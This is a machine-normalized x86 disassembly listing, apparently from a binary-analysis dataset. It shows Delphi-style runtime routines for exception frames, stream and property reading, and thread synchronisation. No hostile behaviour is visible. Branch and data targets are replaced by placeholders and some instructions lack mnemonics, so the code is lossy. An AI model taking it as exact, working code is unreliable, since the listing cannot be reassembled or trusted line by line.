mov eax [ ebp - 0x4 ]
call sub_4186fc
xor ecx ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410978
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
call sub_41770c
mov ecx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4186fc
mov ecx rw-data
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410e54
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4186fc
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410904
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_416db4
jmp r-xdata
jmp r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410e54
jmp r-xdata
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_41770c
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_417c50
pop ecx
jmp r-xdata
sub_4180b4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor esi esi
mov eax ebx
mov edx edi
call sub_404034
jmp r-xdata
mov eax [ ebx ]
call sub_413600
test al al
je r-xdata
inc esi
push ebx
mov [ ebp - 0x10 ] edi
mov [ ebp - 0xc ] 0xb
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx 0x1
mov eax r-xdata
call sub_408c10
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418114
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41842f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4184fc
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_41840d
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_4183ce
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x11 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_418520
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_418520
mov eax [ ebp - 0x1c ]
call sub_4131d4
xor ecx ecx
mov dl 0x1
call [ eax + 0x2c ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_418520
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x2
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_418520
mov eax [ ebp - 0x30 ]
lea edx [ ebp - 0x2c ]
call sub_4180b4
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_418520
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x18 ] edx
push 0x1
mov eax [ ebp - 0xc ]
call sub_4031d8
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_412f24
mov edx [ ebp - 0x4 ]
mov [ edx + 0x74 ] eax
xor eax eax
push ebp
push sub_418373
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x1c ] edx
call sub_405d7c
mov eax [ eax + 0x8 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x34 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
and [ eax + 0x1c ] 0xfffd
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_413918
xor eax eax
push ebp
push sub_418353
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_413ad0
test eax eax
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41835a
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x34 ] edx
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_403290
inc ebx
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x10 ]
call sub_413a74
mov edx [ eax ]
call [ edx + 0xc ]
inc [ ebp - 0x10 ]
dec ebx
jne r-xdata
sub_4183a4
call sub_40274c
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_403a98
jmp r-xdata
call sub_403a44
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_4164a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418414
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_4183d3
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_416650
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
call sub_403a44
call sub_403a98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418414
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0xc ]
call sub_403290
sub_418440
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4184ea
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_4184bd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4186fc
cmp al 0xb
je r-xdata
mov eax ebx
call sub_4107d8
mov eax [ eax + 0x1 ]
mov esi [ eax ]
xor ebx ebx
call sub_416798
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4167d0
cmp eax 0x1f
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4184f1
lea eax [ ebp - 0x8 ]
call sub_403fe0
retn
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_418520
cmp [ ebp - 0x8 ] 0x0
je r-xdata
bts ebx eax
jmp r-xdata
sub_418520
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_416cc0
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_4040d0
mov eax esi
call j_sub_4044ac
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_416cc0
pop edx
pop esi
pop ebx
retn
sub_41855c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_418609
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_416c9c
sub al 0x12
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_418618
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_404268
jmp r-xdata
sub al 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418610
lea eax [ ebp - 0x8 ]
call sub_4046c0
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_4186fc
sub al 0x6
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_416cc0
jmp r-xdata
sub al 0x6
je r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_40462c
mov edx [ esi ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_416cc0
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_416cc0
jmp r-xdata
jmp r-xdata
call sub_416798
sub_418618
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4186ef
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_416c9c
sub al 0x6
je r-xdata
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_41855c
mov edx [ ebp - 0xc ]
mov eax esi
call sub_40480c
jmp r-xdata
sub al 0x6
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4186f6
lea eax [ ebp - 0xc ]
call sub_403fe0
lea eax [ ebp - 0x8 ]
call sub_403fe0
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_4186fc
sub al 0x12
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_416cc0
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404908
mov ecx [ ebp - 0x4 ]
add ecx ecx
mov edx [ esi ]
mov eax ebx
call sub_416cc0
jmp r-xdata
sub al 0x2
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_416cc0
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_40462c
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_416cc0
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_405a1c
jmp r-xdata
jmp r-xdata
call sub_416798
sub_418710
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41874c
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_418520
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418753
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
sub_418758
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_416958
test al al
je r-xdata
mov eax [ ebx ]
call sub_41880c
mov eax [ ebx ]
call sub_4178c4
pop ebx
pop ebp
retn
sub_418780
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_416cc0
mov edx [ ebp - 0x4 ]
imul edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_418c04
pop ebx
pop ecx
pop ebp
retn
sub_4187b0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_416958
test al al
je r-xdata
mov eax [ ebx ]
call sub_416c9c
add al 0xfe
sub al 0x3
jae r-xdata
mov eax [ ebx ]
call sub_4178c4
pop ebx
pop ebp
retn
mov eax [ ebx ]
mov edx 0x1
call sub_418c04
jmp r-xdata
mov eax [ ebx ]
call sub_41880c
mov eax [ ebx ]
call sub_416958
test al al
je r-xdata
mov eax [ ebx ]
call sub_4189a8
mov eax [ ebx ]
call sub_4178c4
sub_41880c
push ebp
mov ebp esp
add esp 0xfffffff8
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41899b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4186fc
and eax 0x7f
cmp eax 0x14
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4189a2
lea eax [ ebp - 0x8 ]
call sub_403fe0
retn
jmp [ eax * 4 + jump_table_418843 ]
push ebp
call sub_418758
pop ecx
jmp r-xdata
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_418c04
jmp r-xdata
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_418c04
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_418c04
jmp r-xdata
mov edx 0xa
mov eax [ ebp - 0x4 ]
call sub_418c04
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_418520
jmp r-xdata
push ebp
mov eax 0x1
call sub_418780
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_418710
jmp r-xdata
push ebp
mov eax 0x1
call sub_418780
pop ecx
jmp r-xdata
push ebp
call sub_4187b0
pop ecx
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_418c04
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_418c04
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_418c04
jmp r-xdata
push ebp
mov eax 0x2
call sub_418780
pop ecx
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_418c04
jmp r-xdata
push ebp
mov eax 0x1
call sub_418780
pop ecx
sub_4189a8
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_4189e5
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_418520
mov eax ebx
call sub_41880c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4189ec
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
sub_4189f0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_418a88
push [ fs : eax ]
mov [ fs : eax ] esp
test dl dl
je r-xdata
mov eax ebx
call sub_416958
test al al
je r-xdata
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x24 ]
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_418520
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_418520
jmp r-xdata
mov eax ebx
call sub_4189a8
mov eax ebx
call sub_4178c4
jmp r-xdata
mov eax ebx
call sub_416958
test al al
je r-xdata
mov dl 0x1
mov eax ebx
call sub_4189f0
mov eax ebx
call sub_4178c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418a8f
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404004
retn
sub_418a98
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_418b3d
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_404078
xor eax eax
mov [ ebp - 0x4 ] eax
mov esi [ ebx + 0x1c ]
test esi esi
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_419934
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418b44
lea eax [ ebp - 0x8 ]
call sub_403fe0
retn
cmp [ ebx + 0x52 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
push edi
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b588
call sub_403a1c
sub_418b68
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
cmp [ eax + 0x42 ] 0x0
je r-xdata
mov edx [ esi ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop edi
pop esi
pop ebx
retn
push esi
mov edi eax
mov ecx ebx
mov edx eax
mov eax [ edi + 0x44 ]
call [ edi + 0x40 ]
sub_418b90
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov ecx esi
mov edx [ ebx + 0x18 ]
mov eax ebx
call sub_416bf0
mov [ esp ] eax
cmp [ esp ] 0x0
jne r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esp
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
mov eax [ ebx + 0x1c ]
cmp eax [ ebx + 0x18 ]
je r-xdata
mov eax esi
call sub_413114
mov edx [ r-xdata ]
mov eax [ esp ]
call sub_4034bc
test al al
jne r-xdata
mov ecx esi
mov edx [ ebx + 0x1c ]
mov eax ebx
call sub_416bf0
mov [ esp ] eax
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
sub_418c04
push ebx
push esi
add esp 0xffffff00
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
add esp 0x100
pop esi
pop ebx
retn
cmp ebx 0x100
jle r-xdata
mov edx esp
mov ecx ebx
mov eax esi
call sub_416cc0
xor ebx ebx
mov edx esp
mov ecx 0x100
mov eax esi
call sub_416cc0
sub ebx 0x100
jmp r-xdata
test ebx ebx
jg r-xdata
sub_418c4c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x1c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_418df5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xa
call sub_416824
xor eax eax
mov [ ebp - 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_418dd0
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_416cc0
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x4 ]
call sub_415750
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x10 ]
call sub_416cc0
push 0x400
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160e0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_418dab
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0xc ]
call sub_41855c
lea edx [ ebp - 0x10 ]
mov ecx 0x4
mov eax [ ebp - 0xc ]
call sub_416cc0
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x8 ]
call sub_415750
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_416cc0
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_410448
test al al
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b54c
call sub_403a1c
lea eax [ ebp - 0x1c ]
call sub_40564c
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x14 ]
call sub_40ce30
test al al
jne r-xdata
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x4 ]
mov [ ebx ] ax
mov edx ebx
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418db2
mov eax [ ebp - 0xc ]
call sub_403290
retn
sub_418e14
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41900e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_40e9a4
mov eax [ ebp - 0x4 ]
call sub_416c9c
and eax 0x7f
cmp eax 0x14
ja r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b54c
call sub_403a1c
jmp [ eax * 4 + jump_table_418e56 ]
mov eax [ ebp - 0x4 ]
call sub_4186fc
cmp al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41780c
mov edx eax
movsx edx dl
mov eax ebx
mov cl 0xff
call sub_40fc80
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41780c
mov edx eax
movsx edx dx
mov eax ebx
mov cl 0xfe
call sub_40fc80
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41780c
mov edx eax
mov eax ebx
mov cl 0xfc
call sub_40fc80
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4175f0
mov eax ebx
call sub_40fd10
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417634
mov eax ebx
call sub_40fd10
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417678
mov eax ebx
call sub_40fd38
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4176c8
mov eax ebx
call sub_40fd24
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41855c
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_40fd4c
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_418618
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_40fd78
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4186fc
cmp al 0x9
sete dl
mov eax ebx
call sub_40fce8
jmp r-xdata
push ebp
lea eax [ ebp - 0x1c ]
call sub_418c4c
pop ecx
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_40eccc
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417878
push edx
push eax
mov eax ebx
call sub_40fcbc
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419015
lea eax [ ebp - 0x1c ]
call sub_40e9b8
lea eax [ ebp - 0xc ]
call sub_4046c0
lea eax [ ebp - 0x8 ]
call sub_403fe0
retn
mov eax ebx
call sub_410530
jmp r-xdata
sub_41901c
push esi
push edi
push ebx
mov esi edx
mov ebx ecx
mov edi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ edi + 0xc ]
sub ecx [ edi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax edi
call sub_419068
mov ecx [ edi + 0xc ]
sub ebx ecx
push edi
mov eax [ edi + 0x8 ]
add eax [ edi + 0x10 ]
add [ edi + 0x10 ] ecx
mov edi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
mov ecx ebx
sub_419094
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
cmp [ esp ] 0xffffff80
jl r-xdata
cmp [ esp ] 0xffff8000
jl r-xdata
cmp [ esp ] 0x7f
jg r-xdata
mov dl 0x4
mov eax ebx
call sub_419204
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41901c
cmp [ esp ] 0x7fff
jg r-xdata
mov dl 0x2
mov eax ebx
call sub_419204
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41901c
pop edx
pop ebx
retn
mov dl 0x3
mov eax ebx
call sub_419204
mov edx esp
mov ecx 0x2
mov eax ebx
call sub_41901c
jmp r-xdata
pop edx
pop ebx
retn
sub_419118
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
mov edx edi
call sub_4043ec
je r-xdata
mov eax esi
call sub_4042a0
mov [ esp ] eax
cmp [ esp ] 0xff
jg r-xdata
mov eax edi
call sub_4042a0
mov [ esp ] eax
mov dl 0x14
mov eax ebx
call sub_419204
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41901c
mov edx edi
mov ecx [ esp ]
mov eax ebx
call sub_41901c
jmp r-xdata
mov dl 0xc
mov eax ebx
call sub_419204
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41901c
mov dl 0x6
mov eax ebx
call sub_419204
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41901c
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov ecx [ esp ]
mov eax ebx
call sub_41901c
sub_4191b0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4191f5
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_405ac0
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_419118
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4191fc
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
sub_41928c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx eax
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
je r-xdata
test ebx ebx
jle r-xdata
call GetCurrentThreadId
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b588
call sub_403a1c
call sub_419264
mov eax ebx
call sub_419270
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_41941a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push rw-data
call InterlockedExchange
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4193fb
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419402
mov eax [ ebp - 0xc ]
call sub_403290
retn
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor edx edx
mov eax [ ebp - 0xc ]
call sub_413a74
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax [ ebp - 0xc ]
